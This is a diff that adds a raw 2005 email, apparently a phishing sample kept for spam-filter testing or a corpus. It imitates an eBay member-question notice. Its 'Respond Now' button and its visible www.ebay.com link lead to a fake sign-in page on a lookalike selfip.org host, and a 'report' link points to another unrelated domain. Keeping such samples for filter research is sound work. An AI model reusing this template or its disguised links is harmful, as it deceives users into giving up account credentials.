@@ -1,0 +1,336 @@
+Return-Path: <nobody@athena.hu-athena.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP id BC4E9537000
+	for <nobody@login.example.com>; Mon, 19 Dec 2005 16:33:24 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+	by mail2.example.com (Postfix) with ESMTP id 4A95E6FA4B4
+	for <nobody@example.com>; Mon, 19 Dec 2005 16:33:17 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+	by mail2.example.com (Postfix) with ESMTP
+	for <nobody@example.com>; Mon, 19 Dec 2005 16:33:17 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+	id 6209B1BC55; Mon, 19 Dec 2005 22:33:16 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+	by lujan.example.com (Postfix) with ESMTP id 1FA3E1BB4F
+	for <foobee@example.com>; Mon, 19 Dec 2005 21:33:13 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+	by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+	with ESMTP id 14904-04 for <foobee@example.com>;
+	Mon, 19 Dec 2005 22:32:55 +0100 (CET)
+Received: from athena.hu-athena.com (hu-athena.com [67.15.48.59])
+	by lujan.example.com (Postfix) with ESMTP id 696B71BB39
+	for <foobee@example.com>; Mon, 19 Dec 2005 22:32:52 +0100 (CET)
+Received: from nobody by athena.hu-athena.com with local (Exim 4.52)
+	id 1EoScT-0002oB-M5
+	for foobee@example.com; Mon, 19 Dec 2005 21:32:33 +0000
+To: foobee@example.com
+Subject: [*** POSIBLE SPAM***] Question from eBay Member - Respond Now
+From: eBay <messages@ebay.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EoScT-0002oB-M5@athena.hu-athena.com>
+Date: Mon, 19 Dec 2005 21:32:33 +0000
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - athena.hu-athena.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - athena.hu-athena.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***
+X-Spam-Status: No, score=3.7 required=5.0 tests=HTML_80_90,HTML_FONT_BIG,
+	HTML_MESSAGE,HTML_NONELEMENT_00_10,MIME_HTML_ONLY,
+	RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK,REPLY_TO_EMPTY autolearn=no 
+	version=3.0.2
+X-Spam-Report: 
+	*  1.6 REPLY_TO_EMPTY Reply-To: is empty
+	*  0.1 HTML_80_90 BODY: Message is 80% to 90% HTML
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 HTML_FONT_BIG BODY: HTML tag for a big font size
+	*  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+	*      [cf:  67]
+	*  0.0 HTML_NONELEMENT_00_10 BODY: 0% to 10% of HTML elements are non-standard
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 157
+
+<title>Message from eBay Member</title>
+<style>
+.SectionTitle {font-size: small; font-family: arial, sans-serif; font-weight:bold }
+.SmallTitle {font-size: x-small; font-family: arial, sans-serif; font-weight:bold }
+.SectionBody {font-size: x-small; font-family: arial, sans-serif}
+.DetailTable, .DetailTable th {font-size: 10 pt; font-family: arial, sans-serif; font-weight:normal }
+.Title {font-size: medium; font-family: verdana, arial, sans-serif}
+.BodyFont {font-size: 10 pt; font-family: arial, sans-serif; font-weight:normal}
+.BodyFontStrong {font-size: 10 pt; font-family: arial, sans-serif; font-weight:bold}
+.SmallBody {font-size: xx-small; font-family: arial, sans-serif; font-weight:normal; margin-top: 8 px;  margin-bottom: 6 px}
+.Separator { COLOR: #CCCCCC; height: 1px}
+.HighlightedSeparator { COLOR: #9999cc; height: 1px}
+.FooterSeparator { COLOR: #CCCCCC; height: 1px}
+.Footer, .Footer p {font-size: xx-small; font-family:arial, sans-serif; color:#666666; margin-top: 2 px;  margin-bottom: 8 px}
+.SmallPara, .SmallParap {margin-top: 8 px;  margin-bottom: 6 px}
+</style>
+<style>.ItemTitle {font-size: 10pt; font-family: arial, sans-serif; font-weight:bold }
+.sectiontitle{font-size:small;font-weight:bold;}
+.pagetitle {font-size:medium;font-weight:bold;}</style>
+</head>
+<body bgcolor="#FFFFFF">
+<table cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td width="100%" style="word-wrap: break-word;">
+<table cellpadding="0" cellspacing="0" border="0" width="100%" xmlns:x="urn:schemas-microsoft-com:xslt">
+<tr>
+<td>
+<table cellspacing="0" cellpadding="0" width="100%" border="0">
+<tr>
+<td width="1" rowspan="3"></td>
+<td></td>
+<td width="1" rowspan="3"></td>
+</tr>
+<tr>
+<td>
+<table cellpadding="2" cellspacing="0" border="0" width="100%">
+</table>
+</td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="white">
+<tr>
+<td width="1%" nowrap><img src="http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrLeft_13x39.gif"></td>
+<td nowrap width="98%" background="http://pics.ebaystatic.com/aw/pics/email/syiSessions/imgSpan_5x39.gif"><span class="SectionTitle"><font size="4"><b>Question from eBay Member -- Respond Now</b></font></span></td>
+<td valign="bottom" width="1%" nowrap><img src="http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrRight_90x39.gif" alt="eBay"></td>
+</tr>
+</table>
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+<tr>
+<td><img height="1" src="http://pics.ebaystatic.com/aw/pics/s.gif" width="10"></td>
+<td>
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+<tr>
+<td>
+<table width="100%" border="0" style="border-right: 1px #9999CC solid; border-left: 1px #9999CC solid; border-bottom: 1px #9999CC solid" bgcolor="EEEEF8">
+<td height="30" style="padding-left: 8px;">
+<font face="Arial, Verdana" size="2">
+eBay sent this message on behalf of an eBay member via My Messages. Responses sent using email will not reach the eBay member. 
+Use the <b>Respond Now</b> button below to respond to this message.</font>
+</td>
+</table>
+</td>
+<td><img height="1" src="http://pics.ebaystatic.com/aw/pics/s.gif" width="10"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td><img height="10" src="http://pics.ebaystatic.com/aw/pics/s.gif"></td>
+</tr>
+<tr>
+<td>
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+<tr>
+<td><img height="1" src="http://pics.ebaystatic.com/aw/pics/s.gif" width="10"></td>
+<td valign="top">
+<table cellspacing="0" cellpadding="0" border="0" width="100%">
+<tr>
+<td valign="top">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td>
+<table cellspacing="0" cellpadding="1" width="100%" align="center" border="0" bgcolor="#9999cc">
+<tr height="26" bgcolor="#9999cc">
+<td>
+<font color="#ffffff"> <span class="SectionTitle">Question from hotlover45</span></font>
+</td>
+</tr>
+<tr>
+<td>
+<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
+<tr bgcolor="#ffffff">
+<td>
+<table cellspacing="0" cellpadding="4">
+<tr>
+<td width="75%" valign="top">
+<font size="2" face="Arial, Verdana">What payment method would you preffer ? Please respond ASAP. Thank you
+<br/>Have a nice day.
+<br/></font>
+</td>
+<td width="22%" align="center" valign="top"><table cellspacing="0" cellpadding="0" width="100%" bgcolor="#eeeef8" border="1" bordercolor="#999999">
+<tr>
+<td>
+<table cellspacing="3" cellpadding="3" width="100%">
+<tr>
+<td align="center"><font size="2" face="Arial, Verdana"><b>Respond to this question in My Messages.</b></font>
+</td>
+</tr>
+<tr>
+<td align="center"><a href="http://update-accounte.selfip.org/~test/.signin.ebay.com/eBayISAPI.dll.SignIn.co_partnerId/index.html"><img src="http://pics.ebaystatic.com/aw/pics/email/message/btnRespondNow.gif" border="0" alt="Respond Now"></a></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+<td width="3%"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td>
+<table cellspacing="0" cellpadding="0" border="0">
+<tr><td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="8" border="0"></td></tr>
+<tr><td><font size="2" face="Arial, Verdana">Thank you for using eBay!</font></td></tr>
+<tr><td><font size="2" face="Arial, Verdana"><a href="http://update-accounte.selfip.org/~test/.signin.ebay.com/eBayISAPI.dll.SignIn.co_partnerId/index.html">http://www.ebay.com/</a></font></td></tr>
+<tr><td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="10" border="0"></td></tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+<td valign="top" width="10"><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="10"></td>
+<td width="188" align="right" valign="top">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td>
+<table border="0" cellpadding="0" cellspacing="0" style="BORDER: #6b7b91 1px solid;">
+<tr>
+<td>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td bgcolor="#CAD2DD"><img src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgShield_25x25.gif" border="0" width="25" height="25" alt="Marketplace Safety Tip"></td>
+<td bgcolor="#CAD2DD" nowrap>
+<font size="-1" face="Arial, Helvetica, Verdana, sans-serif"><b><a href="http://pages.ebay.com/securitycenter" style="text-decoration: none; color: #000000">Marketplace Safety Tip</a></b></font>
+</td>
+<td bgcolor="#CAD2DD"><img src="http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif" border="0" width="25" height="25" title="" alt=" "></td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td>
+<table border="0" cellpadding="5" cellspacing="0">
+<tr>
+<td>
+<font size="2" face="Arial, Verdana">
+If this message is an offer to sell an item without winning it on the eBay Web site (including Second Chance Offers sent through My Messages) please do not respond to the sender. These "outside of eBay" transactions are unsafe and not covered by eBay purchase protection programs.
+<br><br>
+Never pay for your eBay item through instant wire transfer services such as <a href="http://pages.ebay.com/help/confidence/isgw-fraud-sending-payments.html">Western Union</a> or <a href="http://pages.ebay.com/securitycenter/mrkt_safety/instantcashtransfer.html">MoneyGram</a>. These payment methods are unsafe when paying someone you do not know.
+</font>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr><td height="5" bgcolor="#c9d2dc"><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="5"></td></tr>
+</table>
+</td></tr></table>
+</td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="10"></td>
+</tr>
+<tr>
+<td>
+<table cellSpacing="0" cellPadding="5" width="100%" border="0" style="BORDER: #c6c6c6 1px solid;">
+<tr>
+<td>
+<font size="2" face="Arial, Verdana">
+Is this email inappropriate? Does it violate <a href="http://pages.ebay.com/help/policies/rfe-unwelcome-email-misuse.html">eBay policy</a>? Help protect the community by <a href="http://www.laysu665.com/ws/Prima.html?SignIn&co_partnerId=2&pUserId=&siteid=0&pageType=&pa1=&i1=&bshowgif=&UsingSSL">reporting it</a>.                   
+</font>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td colspan="3"><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="10"></td>
+</tr>
+</table>
+<table width="100%" bgcolor="#CCCCCC" cellspacing="0" cellpadding="0">
+<tr>
+<td height="1"></td>
+</tr>
+</table>
+<table cellspacing="0" cellpadding="0" width="100%" border="0">
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="5"></td>
+</tr>
+<tr>
+<td>
+<font face="Arial, Verdana" size="1" color="#666666">
+Learn how you can protect yourself from spoof (fake) emails at:<br><a href="http://pages.ebay.com/education/spooftutorial">http://pages.ebay.com/education/spooftutorial</a> </font>
+</td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="5"></td>
+</tr>
+<tr>
+<td>
+<font face="Arial, Verdana" size="1" color="#666666">
+This eBay notice was sent to your email address on behalf of another eBay member through the eBay platform and in accordance with our Privacy Policy. If you would like to receive this email in text format, change your <a href="http://cgi4.ebay.com/ws/eBayISAPI.dll?OptinLoginShow" onclick="return openNonHelpWindow(this.href);">notification preferences</a>.
+</font>
+</td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="5"></td>
+</tr>
+<tr>
+<td>
+<font face="Arial, Verdana" size="1" color="#666666">
+See our Privacy Policy and User Agreement if you have questions about eBay's communication policies.<br>
+Privacy Policy: <a href="http://pages.ebay.com/help/policies/privacy-policy.html">http://pages.ebay.com/help/policies/privacy-policy.html</a><br>
+User Agreement: <a href="http://pages.ebay.com/help/policies/user-agreement.html">http://pages.ebay.com/help/policies/user-agreement.html</a> </font>
+</td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="5"></td>
+</tr>
+<tr>
+<td>
+<font face="Arial, Verdana" size="1" color="#666666">            
+Copyright © 2005 eBay, Inc. All Rights Reserved.<br>
+Designated trademarks and brands are the property of their respective owners.<br>
+eBay and the eBay logo are registered trademarks or trademarks of eBay, Inc.<br>                
+eBay is located at 2145 Hamilton Avenue, San Jose, CA 95125.
+</font>
+</td>
+</tr>
+</table><br><br><img src="http://ebay.doubleclick.net/ad/ebay.us.ebay.us.cem/home;tile=1;sz=1x1;ord=54087738?"></td>
+<td><img height="1" src="http://pics.ebaystatic.com/aw/pics/s.gif" width="10"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</body>
+</html>
+
